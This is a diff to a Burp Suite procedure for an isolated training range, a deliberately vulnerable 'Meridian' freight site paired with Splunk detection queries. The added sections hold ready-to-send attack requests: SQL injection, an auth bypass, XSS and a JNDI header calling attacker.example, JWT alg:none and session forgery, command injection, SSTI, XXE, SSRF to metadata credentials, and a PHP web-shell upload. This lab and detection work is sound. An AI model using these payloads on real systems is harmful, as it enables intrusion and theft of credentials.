@@ -1,17 +1,13 @@
-# Burp Suite guide — Meridian target
+# Burp Suite guide — Meridian Freight Solutions target
 
-> This guide covers the OWASP Top 10 baseline endpoints. The range is now a
-> 22-challenge CTF; the challenges this guide does not reach (command injection,
-> SSTI, XXE, path traversal, file upload, JWT `alg:none`, forged Flask sessions,
-> predictable reset tokens) are covered in [`ASSESSMENT_PLAYBOOK.md`](ASSESSMENT_PLAYBOOK.md)
-> section 7, with Repeater-ready requests.
+A manual Repeater and Intruder procedure for the Meridian target. Every request
+below hits a real business feature; the proof of exploitation is a `MERIDIAN{...}`
+value inside recovered data.
 
-This guide is only for the isolated `HELPAG-VAPT-Test-Site` deployed in your
-authorized lab. Do not aim these requests at a public or production system.
+This guide is only for the isolated target deployed in your authorized lab. Do
+not aim these requests at a public or production system.
 
 ## 1. Lab layout and prerequisites
-
-Recommended layout:
 
 ```text
 Burp/VAPT workstation  --->  Windows IIS :8080  --->  Waitress :5005
@@ -22,41 +18,30 @@ Burp/VAPT workstation  --->  Windows IIS :8080  --->  Waitress :5005
 
 Before testing:
 
-1. Deploy the site with `iis/Install-IIS-LabSite.ps1`.
+1. Deploy with `iis/Install-IIS-LabSite.ps1` (or `docker compose up -d`).
 2. Confirm `http://IIS_LAB_IP:8080/health` returns `lab_mode: true`.
-3. Confirm both the tester and Splunk can reach the IIS server.
-4. Add only the IIS hostname/IP and port to Burp's target scope.
-5. Never add wildcard lab domains, production ranges, or Internet targets.
-6. Create the Splunk `vapt_lab` index and configure the inputs in
-   `splunk/README.md`.
+3. Confirm both the tester and Splunk can reach the server.
+4. Add only the target hostname/IP and port to Burp's scope. Never add wildcard
+   lab domains, production ranges, or Internet targets.
+5. Create the Splunk `vapt_lab` index and configure inputs per
+   [`SPLUNK_INTEGRATION_GUIDE.md`](SPLUNK_INTEGRATION_GUIDE.md).
 
-Set a test identifier such as `BURP-20260913-01`. Add this header to every Burp
-request so the corresponding event is easy to find:
+Set a test identifier and add it to every request with **Proxy > Match and
+replace**, so each event is easy to find:
 
 ```http
-X-Lab-Test-ID: BURP-20260913-01
+X-Lab-Test-ID: BURP-20260914-01
 ```
-
-In Burp, use **Proxy > Match and replace** to add the header automatically, or
-add it manually in Repeater.
 
 ## 2. Configure Burp
 
 1. Start a temporary Burp project.
-2. Use Burp's built-in browser, or proxy an external browser through
-   `127.0.0.1:8080`.
-3. Browse to `http://IIS_LAB_IP:8080`.
-4. In **Target > Site map**, right-click the IIS host and choose **Add to scope**.
-5. Select the option to stop logging out-of-scope traffic if offered.
-6. Keep interception off while browsing normally; send interesting requests to
-   Repeater with **Control-R**.
+2. Use Burp's built-in browser, or proxy an external browser through Burp.
+3. Browse `http://IIS_LAB_IP:8080` — you should get the Meridian homepage.
+4. **Target > Site map**, right-click the host, **Add to scope**.
+5. Send interesting requests to Repeater with **Ctrl-R**.
 
-If Burp and IIS run on the same machine, change either Burp's listener port or
-the IIS port so they do not both use 8080.
-
-## 3. Establish a baseline
-
-Send this request to Repeater:
+## 3. Baseline
 
 ```http
 GET /health HTTP/1.1
@@ -65,247 +50,290 @@ X-Lab-Test-ID: BURP-BASELINE-001
 Connection: close
 ```
 
-Expected response: HTTP 200 with `{"lab_mode":true,"status":"healthy"}`.
-
-Splunk baseline:
+Expected: `{"lab_mode":true,"status":"healthy"}`.
 
 ```spl
 index=vapt_lab test_id=BURP-BASELINE-001
-| table _time source_ip method path status duration_ms user_agent test_id
+| table _time source_ip method path status duration_ms user_agent
 ```
 
-## 4. A01 — Broken Access Control
+## 4. Recon and exposed files (A01, A05)
 
-Capture `GET /api/users/1`, send it to Repeater, and change the ID to `2`:
+Send each to Repeater. None require authentication.
 
 ```http
-GET /api/users/2 HTTP/1.1
+GET /robots.txt HTTP/1.1
+GET /internal/it-runbook.txt HTTP/1.1
+GET /.env HTTP/1.1
+GET /backups/ HTTP/1.1
+GET /backups/meridian-db-export.sql HTTP/1.1
+GET /status/diagnostics HTTP/1.1
+```
+
+Expected: the runbook, the environment file, the nightly SQL export and the
+status page each disclose a `MERIDIAN{...}` value. The runbook and `.env` also
+hand over credentials used later.
+
+```spl
+index=vapt_lab test_id=BURP-* event_type IN (recon_hidden_path,sensitive_file_access,directory_listing_access,debug_endpoint_access)
+| table _time source_ip event_type artifact
+```
+
+## 5. A01 — Broken Access Control (IDOR)
+
+Capture a tracking request for one of your own consignments, send it to
+Repeater, and change the reference:
+
+```http
+GET /api/v1/shipments/MFS-2026-4471 HTTP/1.1
 Host: IIS_LAB_IP:8080
 X-Lab-Test-ID: BURP-A01-001
 Connection: close
 ```
 
-Expected: another synthetic user's record is returned without a session or
-authorization check. Record HTTP status, exposed fields, and both object IDs.
+Expected: another customer's EUR 742,000 consignment, with the release reference
+in its handling notes — no session required. Use **Intruder > Sniper** on the
+numeric part of the reference with a number payload (4460–4480) and a
+**Grep - Match** on `MERIDIAN{` to find it automatically.
 
 ```spl
 index=vapt_lab event_type=broken_access_attempt test_id=BURP-A01-001
-| table _time source_ip object_id allowed path
-```
-
-## 5. A02 — Cryptographic Failures
-
-```http
-GET /api/backup HTTP/1.1
-Host: IIS_LAB_IP:8080
-X-Lab-Test-ID: BURP-A02-001
-Connection: close
-```
-
-Expected: only synthetic lab secrets, an MD5 example, and missing transport
-policy information are returned. Do not replace these with real credentials.
-
-```spl
-index=vapt_lab event_type=sensitive_data_exposure test_id=BURP-A02-001
-| table _time source_ip artifact path
+| table _time source_ip object_id allowed
 ```
 
 ## 6. A03 — Injection
 
-### SQL injection
-
-Send a normal request first, then replace `Security` with the URL-encoded input
-`%27%20OR%201%3D1--`:
+### SQL injection (rate search)
 
 ```http
-GET /api/products/search?q=%27%20OR%201%3D1-- HTTP/1.1
+GET /api/v1/rates/search?q=%27%20UNION%20SELECT%20id%2Cpartner%2Capi_key%20FROM%20integration_credentials--%20 HTTP/1.1
 Host: IIS_LAB_IP:8080
 X-Lab-Test-ID: BURP-A03-SQL-001
 Connection: close
 ```
 
-Expected: all three synthetic products are returned rather than a filtered
-result. Compare it with `/api/products/search?q=Security`.
+Compare with `?q=Rotterdam`. Expected: the partner API keys are returned.
 
-### Reflected XSS
+### Auth bypass (legacy login)
 
 ```http
-GET /reflect?name=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
+POST /portal/login?legacy=1 HTTP/1.1
 Host: IIS_LAB_IP:8080
-X-Lab-Test-ID: BURP-A03-XSS-001
+Content-Type: application/json
+X-Lab-Test-ID: BURP-A03-SQL-002
 Connection: close
+
+{"username":"ops_console'-- ","password":"x"}
 ```
 
-Use **Show response in browser** only for this lab response. Expected: the input
-is inserted without output encoding.
+Expected: authenticated as `ops_console` with no valid password. The current
+path (`/portal/login`, no `legacy=1`) rejects the same payload.
+
+### Reflected XSS (site search → support agent)
+
+```http
+GET /search?q=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
+```
+
+Then deliver it to the simulated agent:
+
+```http
+GET /support/shared-search?q=%3Cscript%3Efetch(%22//attacker.example%22)%3C%2Fscript%3E HTTP/1.1
+```
+
+Expected: the agent's session cookie is returned base64-encoded in `captured`.
 
 ```spl
-index=vapt_lab test_id IN (BURP-A03-SQL-001,BURP-A03-XSS-001)
-| table _time event_type query_input reflected_input suspicious source_ip
+index=vapt_lab test_id=BURP-A03-* 
+| table _time event_type query_input search_term suspicious source_ip
 ```
 
 ## 7. A04 — Insecure Design
 
 ```http
-POST /api/checkout HTTP/1.1
+POST /services/quote HTTP/1.1
 Host: IIS_LAB_IP:8080
 Content-Type: application/json
 X-Lab-Test-ID: BURP-A04-001
 Connection: close
 
-{"quantity":-5,"unit_price":100}
+{"weight_kg":-1200,"rate_per_kg":0.42}
 ```
 
-Expected: the server accepts a negative total. Retest with a positive quantity
-to document the control case.
+Expected: a negative total issues a credit note carrying its authorisation
+reference. Retest with a positive weight for the control case.
 
 ```spl
 index=vapt_lab event_type=business_logic_abuse test_id=BURP-A04-001
-| table _time source_ip quantity unit_price total
+| table _time source_ip weight_kg rate_per_kg total
 ```
 
-## 8. A05 — Security Misconfiguration
+## 8. A02 / A07 — Authentication and session handling
+
+### Brute force (no lockout)
+
+Send to Intruder, **Sniper** on the password:
 
 ```http
-GET /api/debug/config HTTP/1.1
-Host: IIS_LAB_IP:8080
-X-Lab-Test-ID: BURP-A05-001
-Connection: close
-```
-
-Expected: a synthetic debug configuration is disclosed.
-
-```spl
-index=vapt_lab event_type=debug_endpoint_access test_id=BURP-A05-001
-```
-
-## 9. A06 — Vulnerable and Outdated Components
-
-```http
-GET /api/components HTTP/1.1
-Host: IIS_LAB_IP:8080
-X-Lab-Test-ID: BURP-A06-001
-Connection: close
-```
-
-Expected: simulated component names and versions. They are not actually
-installed and must not be used as proof of a host vulnerability.
-
-```spl
-index=vapt_lab event_type=outdated_component_inventory test_id=BURP-A06-001
-```
-
-## 10. A07 — Authentication Failures with Intruder
-
-Send the login request to Intruder:
-
-```http
-POST /api/login HTTP/1.1
+POST /portal/login HTTP/1.1
 Host: IIS_LAB_IP:8080
 Content-Type: application/json
 X-Lab-Test-ID: BURP-A07-001
 Connection: close
 
-{"username":"admin","password":"§candidate§"}
+{"username":"svc_edi","password":"§candidate§"}
 ```
 
-Use a **Sniper** attack with this small lab-only payload list:
+Payload list: `Autumn2023`, `autumn2023`, `Password1`, `summer2024`,
+`autumn2024`. Grep-Match `"authenticated":true`. Expected: no lockout;
+`autumn2024` succeeds and the response carries the EDI transfer key.
 
-```text
-wrong
-Password1
-admin123
-admin
-```
+### JWT alg:none
 
-Use one thread and no more than one request per second. Add a response grep item
-for `"authenticated":true`. Expected: there is no lockout and `admin` succeeds.
-
-```spl
-index=vapt_lab event_type=authentication_attempt test_id=BURP-A07-001
-| stats count count(eval(success=false)) as failures count(eval(success=true)) as successes by source_ip username
-```
-
-## 11. A08 — Software and Data Integrity Failures
+Get a token from `GET /api/v1/auth/token`, decode the header in **Decoder**,
+rebuild it with `{"alg":"none"}` and `{"role":"finance"}`, drop the signature
+(keep the trailing dot):
 
 ```http
-POST /api/preferences/import HTTP/1.1
+GET /api/v1/reports/financial HTTP/1.1
+Host: IIS_LAB_IP:8080
+Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJoYXJib3JsaW5lIiwicm9sZSI6ImZpbmFuY2UifQ.
+X-Lab-Test-ID: BURP-A07-002
+Connection: close
+```
+
+Expected: the restricted financial report.
+
+### Forged session (weak secret)
+
+The signing key `meridian-default-signing-key` is in `/.env`, `/internal/it-runbook.txt`
+and `/instance/app-secrets.ini`. Forge with `flask-unsign` or
+`tools/forge_session.py`, then in Repeater set:
+
+```http
+GET /admin HTTP/1.1
+Host: IIS_LAB_IP:8080
+Cookie: session=<forged>
+X-Lab-Test-ID: BURP-A02-001
+Connection: close
+```
+
+Expected: the administration area and the DR master code. Add the cookie to a
+**Session handling rule** to reuse it across the staff-only requests below.
+
+```spl
+index=vapt_lab test_id=BURP-A0(2|7)-* event_type IN (authentication_attempt,brute_force_suspected,jwt_unsigned_accepted,forged_session_detected)
+| table _time source_ip event_type username algorithm reason
+```
+
+## 9. A03 — Execution (staff session required)
+
+With the forged staff cookie set:
+
+```http
+POST /admin/diagnostics HTTP/1.1
 Host: IIS_LAB_IP:8080
 Content-Type: application/json
-X-Lab-Test-ID: BURP-A08-001
+Cookie: session=<forged>
+X-Lab-Test-ID: BURP-RCE-001
 Connection: close
 
-{"theme":"dark","role":"admin"}
+{"host":"127.0.0.1; cat instance/keys/depot-transfer.key"}
 ```
 
-Expected: the unsigned role is accepted.
-
-```spl
-index=vapt_lab event_type=unsigned_data_import test_id=BURP-A08-001
-| table _time source_ip imported_role signature_checked
-```
-
-## 12. A09 — Logging and Monitoring Failures
+SSTI in the campaign editor:
 
 ```http
-POST /api/quiet-transfer HTTP/1.1
+GET /admin/campaigns/preview?body=%7B%7B7*7%7D%7D HTTP/1.1
+Cookie: session=<forged>
+```
+
+Then the runtime read (URL-encode the braces payload from
+[`ASSESSMENT_PLAYBOOK.md`](ASSESSMENT_PLAYBOOK.md) finding 13).
+
+```spl
+index=vapt_lab test_id=BURP-RCE-* event_type IN (command_execution,ssti_attempt)
+| table _time source_ip command_line template_input
+```
+
+## 10. A05 — XXE (supplier EDI import)
+
+```http
+POST /api/v1/edi/manifest HTTP/1.1
 Host: IIS_LAB_IP:8080
-Content-Type: application/json
-X-Lab-Test-ID: BURP-A09-001
+Content-Type: application/xml
+X-Lab-Test-ID: BURP-XXE-001
 Connection: close
 
-{"amount":9999}
+<?xml version="1.0"?>
+<!DOCTYPE m [<!ENTITY x SYSTEM "file:///app/instance/edi/partner-manifest.key">]>
+<manifest><consignor>&x;</consignor></manifest>
 ```
 
-Expected: the action succeeds, but its intentionally incomplete audit event has
-no actor or destination.
+Expected: the entity expands to the EDI signing key. On IIS replace `/app` with
+the repository path.
 
-```spl
-index=vapt_lab event_type=monitoring_gap_simulated test_id=BURP-A09-001
-| table _time amount actor destination source_ip
-```
-
-## 13. A10 — Bounded SSRF
-
-For IIS/Waitress on the same Windows host:
+## 11. A06 — Vulnerable components (JNDI)
 
 ```http
-GET /api/fetch?url=http%3A%2F%2F127.0.0.1%3A5005%2Fhealth HTTP/1.1
+GET /api/v1/audit/event HTTP/1.1
 Host: IIS_LAB_IP:8080
+X-Tracking-Agent: ${jndi:ldap://attacker.example/a}
+X-Lab-Test-ID: BURP-A06-001
+Connection: close
+```
+
+Expected: the lookup expands (simulated) and returns the audit service token.
+
+## 12. A10 — SSRF (link preview, staff session)
+
+```http
+GET /admin/integrations/preview?url=http%3A%2F%2Fmetadata%3A8080%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2Fmfs-web-instance-role HTTP/1.1
+Host: IIS_LAB_IP:8080
+Cookie: session=<forged>
 X-Lab-Test-ID: BURP-A10-001
 Connection: close
 ```
 
-Expected: the server fetches its localhost-only backend health endpoint. Public
-or arbitrary destinations return HTTP 403 because this training build bounds
-SSRF to lab-local names.
+Expected: instance role credentials. Arbitrary external destinations return 403.
 
 ```spl
 index=vapt_lab event_type=ssrf_probe test_id=BURP-A10-001
-| table _time source_ip target allowed severity
+| table _time source_ip target allowed
 ```
 
-## 14. Burp automated scanning
+## 13. A04 — Unrestricted upload
 
-With Burp Professional, right-click only the scoped IIS host and choose **Scan**.
-Use a crawl/audit configuration that excludes denial-of-service checks and keep
-concurrency low. Burp Community users can crawl manually, review passive issues,
-and execute the Repeater/Intruder procedures above.
+```http
+POST /careers/apply HTTP/1.1
+Host: IIS_LAB_IP:8080
+Content-Type: multipart/form-data; boundary=----b
+X-Lab-Test-ID: BURP-UP-001
+Connection: close
 
-Do not treat automated scanner output as confirmed. Reproduce each candidate in
-Repeater and retain the exact request and response.
+------b
+Content-Disposition: form-data; name="cv"; filename="cv.php"
+Content-Type: application/octet-stream
 
-## 15. Evidence and final acceptance
+<?php system($_GET["c"]); ?>
+------b--
+```
 
-For every case capture:
+Then browse `GET /uploads/` and retrieve `hr-onboarding-pack-2026.txt`. Expected:
+the store is browsable and yields another applicant's document.
 
-- Test ID, date/time, tester, source workstation, target URL, and authorization.
-- Burp request and response export.
-- Screenshot showing the relevant response behavior.
-- Corresponding application event and IIS access event in Splunk.
-- Impact, expected remediation, retest outcome, and false-positive notes.
+## 14. Automated scanning
 
-Final coverage query:
+With Burp Professional, right-click only the scoped host and **Scan** with a
+crawl/audit config that excludes denial-of-service checks; keep concurrency low.
+Do not treat scanner output as confirmed — reproduce each candidate in Repeater
+and keep the exact request and response.
+
+## 15. Evidence and acceptance
+
+For every case capture: test ID, timestamp, tester, target, and authorization;
+the Burp request/response; a screenshot of the recovered `MERIDIAN{...}` value;
+and the matching application and IIS events in Splunk.
 
 ```spl
 index=vapt_lab test_id="BURP-*" earliest=-24h
@@ -313,43 +341,7 @@ index=vapt_lab test_id="BURP-*" earliest=-24h
 | sort test_id event_type
 ```
 
-Pass criteria: all planned requests have matching IIS and application telemetry,
-all OWASP event types are searchable, and every finding is reproducible in Burp
-Repeater. A missing event is a telemetry failure even when the vulnerable
-behavior itself is reproduced.
-
-
-
----
-
-## 16. CTF challenges beyond the OWASP baseline
-
-Load these into Repeater alongside the sections above. Full walkthroughs, flags
-and detection SPL are in [`ASSESSMENT_PLAYBOOK.md`](ASSESSMENT_PLAYBOOK.md).
-
-| Challenge | Request to build in Repeater |
-|---|---|
-| Path traversal | `GET /api/documents/download?file=../flagstore/traversal.flag` |
-| Command injection | `GET /api/diagnostics/ping?host=127.0.0.1;+id` |
-| SSTI | `GET /api/newsletter/preview?template={{7*7}}` |
-| XXE | `POST /api/suppliers/import` with an XML body declaring a `SYSTEM` entity |
-| Unrestricted upload | `POST /api/upload`, multipart field `file`, filename `shell.php` |
-| JWT `alg:none` | `GET /api/admin/report` with a forged unsigned bearer token |
-| Forged session | `GET /admin/panel` with a session cookie signed by the leaked secret |
-| Mass assignment | `POST /api/profile/update` with `{"role":"admin"}` |
-| Predictable reset | `POST /api/password-reset/consume` with `md5(username)` as the token |
-| JNDI lookup | `GET /api/legacy/audit` with header `X-Audit-Agent: ${jndi:ldap://x/a}` |
-
-**Intruder tips for this range**
-
-- *Sniper* on `/api/users/§1§` with a number payload set enumerates the IDOR —
-  set Grep-Match on `HELPAG{` to find the interesting record instantly.
-- *Cluster bomb* on `/api/login` with `wordlists/helpag-passwords.txt` reproduces
-  the brute-force challenge; there is no lockout, so no throttling is needed.
-- Use Burp's **Decoder** on a JWT from `/api/token` to see the `alg` header, then
-  re-encode with `"alg":"none"` and drop the signature segment.
-- Burp's **Session handling rules** will happily replay a forged
-  `session` cookie across every request once you set it in a macro.
-
-Grep-Match `HELPAG{` in Intruder and Scanner results — every successful exploit
-on this range returns its flag in the response body.
+Pass criteria: every planned request has matching IIS and application telemetry,
+every finding is reproducible in Repeater, and the kill-chain search (UC-21 in
+[`ATTACK_SIMULATION.md`](ATTACK_SIMULATION.md)) links them to one source. A
+missing event is a telemetry failure even when the behavior itself reproduces.
